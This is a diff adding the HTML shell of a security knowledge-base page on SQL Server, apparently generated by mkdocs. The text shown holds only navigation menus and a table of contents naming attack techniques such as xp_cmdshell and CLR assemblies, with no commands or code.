@@ -1,0 +1,3243 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+    
+    
+      
+        <title>Databases sqlserver - Security Knowledge Base</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/application.1b62728e.css">
+      
+      
+    
+    
+      <script src="../assets/javascripts/modernizr.268332fc.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
+    
+    
+      <link rel="stylesheet" href="../_site/extra.css">
+    
+    
+      
+    
+    
+  </head>
+  
+    <body dir="ltr">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#quick-reference" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href=".." title="Security Knowledge Base" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              Security Knowledge Base
+            </span>
+            <span class="md-header-nav__topic">
+              
+                Databases sqlserver
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href=".." title="Security Knowledge Base" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    Security Knowledge Base
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href=".." title="Home" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../bug-hunting/" title="Bug hunting" class="md-nav__link">
+      Bug hunting
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../career/" title="Career" class="md-nav__link">
+      Career
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../collections/" title="Collections" class="md-nav__link">
+      Collections
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../container/" title="Container" class="md-nav__link">
+      Container
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../crypto/" title="Crypto" class="md-nav__link">
+      Crypto
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Databases sqlserver
+      </label>
+    
+    <a href="./" title="Databases sqlserver" class="md-nav__link md-nav__link--active">
+      Databases sqlserver
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#quick-reference" class="md-nav__link">
+    Quick Reference
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#roles-and-permissions" class="md-nav__link">
+    Roles and Permissions
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#principals" class="md-nav__link">
+    Principals
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#server-level-roles-and-permissions" class="md-nav__link">
+    Server-Level Roles and Permissions
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#database-level-roles-and-permissions" class="md-nav__link">
+    Database Level Roles and Permissions
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#application-roles" class="md-nav__link">
+    Application Roles
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#queries" class="md-nav__link">
+    Queries
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    Exploitation
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#brute-forcing" class="md-nav__link">
+    Brute-forcing
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#command-execution" class="md-nav__link">
+    Command Execution
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xp_cmdshell" class="md-nav__link">
+    xp_cmdshell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#custom-extended-stored-procedures" class="md-nav__link">
+    Custom Extended Stored Procedures
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#custom-clr-assemblies" class="md-nav__link">
+    Custom CLR Assemblies
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ole-automation-procedure" class="md-nav__link">
+    OLE Automation Procedure
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#agent-jobs-cmdexec-powershell-activex-etc" class="md-nav__link">
+    Agent Jobs (CmdExec, PowerShell, ActiveX etc.)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#external-scripting" class="md-nav__link">
+    External Scripting
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#registry-autoruns" class="md-nav__link">
+    Registry Autoruns
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-autoruns" class="md-nav__link">
+    File Autoruns
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../databases/" title="Databases" class="md-nav__link">
+      Databases
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../dfir/" title="Dfir" class="md-nav__link">
+      Dfir
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
+      Embedded and iot
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
+      Exploits and shellcoding
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../languages/" title="Languages" class="md-nav__link">
+      Languages
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../linux-issues/" title="Linux issues" class="md-nav__link">
+      Linux issues
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../linux/" title="Linux" class="md-nav__link">
+      Linux
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../malware/" title="Malware" class="md-nav__link">
+      Malware
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../operating-systems/" title="Operating systems" class="md-nav__link">
+      Operating systems
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../osint/" title="Osint" class="md-nav__link">
+      Osint
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../password-attacks/" title="Password attacks" class="md-nav__link">
+      Password attacks
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
+      Reverse engineering
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../rf-and-sdr/" title="Rf and sdr" class="md-nav__link">
+      Rf and sdr
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../steganography/" title="Steganography" class="md-nav__link">
+      Steganography
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../vulnerable/" title="Vulnerable" class="md-nav__link">
+      Vulnerable
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../web/" title="Web" class="md-nav__link">
+      Web
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../windows-active-directory/" title="Windows active directory" class="md-nav__link">
+      Windows active directory
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../windows-issues/" title="Windows issues" class="md-nav__link">
+      Windows issues
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../windows/" title="Windows" class="md-nav__link">
+      Windows
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-27" type="checkbox" id="nav-27">
+    
+    <label class="md-nav__link" for="nav-27">
+      Certifications
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-27">
+        Certifications
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/cissp/" title="Cissp" class="md-nav__link">
+      Cissp
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/osce/" title="Osce" class="md-nav__link">
+      Osce
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-27-3" type="checkbox" id="nav-27-3">
+    
+    <label class="md-nav__link" for="nav-27-3">
+      Oscp
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-27-3">
+        Oscp
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
+      Enumeration
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/_collections/" title="collections" class="md-nav__link">
+       collections
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
+      Was checking
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
+      Lab Setup
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/notes/" title="Notes" class="md-nav__link">
+      Notes
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
+      Practice
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/setup/" title="Setup" class="md-nav__link">
+      Setup
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
+      Tools
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-27-3-9" type="checkbox" id="nav-27-3-9">
+    
+    <label class="md-nav__link" for="nav-27-3-9">
+      Cheatsheet
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-27-3-9">
+        Cheatsheet
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
+      Cheatsheets
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
+      Download
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
+      Exploits
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
+      Post exploitation
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
+      Share files
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
+      Bash
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
+      TTY
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
+      Web
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
+      Windows
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-27-3-9-10" type="checkbox" id="nav-27-3-9-10">
+    
+    <label class="md-nav__link" for="nav-27-3-9-10">
+      Enumeration
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
+      <label class="md-nav__title" for="nav-27-3-9-10">
+        Enumeration
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
+      Network
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
+      Vulnerability
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
+      Windows local
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-28" type="checkbox" id="nav-28">
+    
+    <label class="md-nav__link" for="nav-28">
+      Cloud
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-28">
+        Cloud
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../cloud/aws/" title="Aws" class="md-nav__link">
+      Aws
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../cloud/azuer/" title="Azuer" class="md-nav__link">
+      Azuer
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-29" type="checkbox" id="nav-29">
+    
+    <label class="md-nav__link" for="nav-29">
+      Identity and access management
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-29">
+        Identity and access management
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../identity-and-access-management/jwt/" title="Jwt" class="md-nav__link">
+      Jwt
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../identity-and-access-management/kerberos/" title="Kerberos" class="md-nav__link">
+      Kerberos
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../identity-and-access-management/oauth2-and-oidc/" title="Oauth2 and oidc" class="md-nav__link">
+      Oauth2 and oidc
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-30" type="checkbox" id="nav-30">
+    
+    <label class="md-nav__link" for="nav-30">
+      Network
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-30">
+        Network
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
+      Cheatsheets
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/discovery/" title="Discovery" class="md-nav__link">
+      Discovery
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/domain-fronting/" title="Domain Fronting" class="md-nav__link">
+      Domain Fronting
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/port-forwarding-and-tunneling/" title="Port Forwarding" class="md-nav__link">
+      Port Forwarding
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/port-scanning/" title="Port Scanning" class="md-nav__link">
+      Port Scanning
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/traffic-analysis/" title="Traffic Analysis" class="md-nav__link">
+      Traffic Analysis
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/vulnerability-scanning/" title="Vulnerability Scanning" class="md-nav__link">
+      Vulnerability Scanning
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/wireless/" title="Wireless" class="md-nav__link">
+      Wireless
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/x-Defense/" title="x Defense" class="md-nav__link">
+      x Defense
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/y-Tools-Netcat/" title="y Tools Netcat" class="md-nav__link">
+      y Tools Netcat
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/y-Tools-Netstat/" title="y Tools Netstat" class="md-nav__link">
+      y Tools Netstat
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/y-Tools-Nmap/" title="Nmap" class="md-nav__link">
+      Nmap
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/y-Tools/" title="Tools" class="md-nav__link">
+      Tools
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../network/z-References/" title="References" class="md-nav__link">
+      References
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31" type="checkbox" id="nav-31">
+    
+    <label class="md-nav__link" for="nav-31">
+      Os
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-31">
+        Os
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31-1" type="checkbox" id="nav-31-1">
+    
+    <label class="md-nav__link" for="nav-31-1">
+      Windows
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-31-1">
+        Windows
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
+      Cheatsheet
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/active-directory/" title="Active Directory" class="md-nav__link">
+      Active Directory
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/api/" title="Windows API" class="md-nav__link">
+      Windows API
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/applocker/" title="Applocker" class="md-nav__link">
+      Applocker
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/events/" title="Events" class="md-nav__link">
+      Events
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/hyperv/" title="HyperV" class="md-nav__link">
+      HyperV
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/important-endpoints/" title="Important Endpoints" class="md-nav__link">
+      Important Endpoints
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/important-files/" title="Important Files" class="md-nav__link">
+      Important Files
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/important-issues/" title="Important issues" class="md-nav__link">
+      Important issues
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/important-processes/" title="Important Processes" class="md-nav__link">
+      Important Processes
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/important-reg-locations/" title="Important Registry Locations" class="md-nav__link">
+      Important Registry Locations
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/kernel-exploitation/" title="Kernel Exploitation" class="md-nav__link">
+      Kernel Exploitation
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/mix/" title="Mix" class="md-nav__link">
+      Mix
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/post-exploitation/" title="Post exploitation" class="md-nav__link">
+      Post exploitation
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/privilege-escalation/" title="Privilege Escalation" class="md-nav__link">
+      Privilege Escalation
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/user-accounts/" title="User accounts" class="md-nav__link">
+      User accounts
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/wmi/" title="Wmi" class="md-nav__link">
+      Wmi
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/x-Bypass/" title="Defense Bypass" class="md-nav__link">
+      Defense Bypass
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/x-Defense/" title="Defense" class="md-nav__link">
+      Defense
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/y-Tools/" title="Tools" class="md-nav__link">
+      Tools
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/z-References/" title="References" class="md-nav__link">
+      References
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31-1-22" type="checkbox" id="nav-31-1-22">
+    
+    <label class="md-nav__link" for="nav-31-1-22">
+      Credentials
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-31-1-22">
+        Credentials
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/credentials/0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
+      Cheatsheet
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/credentials/using-credentials/" title="Using Credentials" class="md-nav__link">
+      Using Credentials
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31-1-23" type="checkbox" id="nav-31-1-23">
+    
+    <label class="md-nav__link" for="nav-31-1-23">
+      Powershell
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-31-1-23">
+        Powershell
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/powershell/0-cheatsheet/" title="Cheatsheet" class="md-nav__link">
+      Cheatsheet
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/powershell/collections/" title="Collections" class="md-nav__link">
+      Collections
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/powershell/modules/" title="Modules" class="md-nav__link">
+      Modules
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/powershell/powershell/" title="Reverse Shell" class="md-nav__link">
+      Reverse Shell
+    </a>
+  </li>
+
+        
